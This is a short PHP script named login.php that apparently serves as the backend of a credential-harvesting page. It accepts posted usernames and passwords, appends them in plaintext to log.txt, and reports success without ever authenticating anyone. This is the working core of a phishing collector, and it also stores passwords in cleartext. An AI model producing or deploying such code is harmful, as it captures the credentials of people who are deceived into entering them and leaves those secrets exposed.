<?php
// login.php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['user'] ?? '';
    $password = $_POST['password'] ?? '';

    // Append incoming information to a file
    $logData = "Username: $username, Password: $password\n";
    file_put_contents('log.txt', $logData, FILE_APPEND);

    // Send a successful response
    echo json_encode(['success' => true]);
} else {
    // Send error message if not POST request
    echo json_encode(['error' => 'Invalid request']);
}
?>
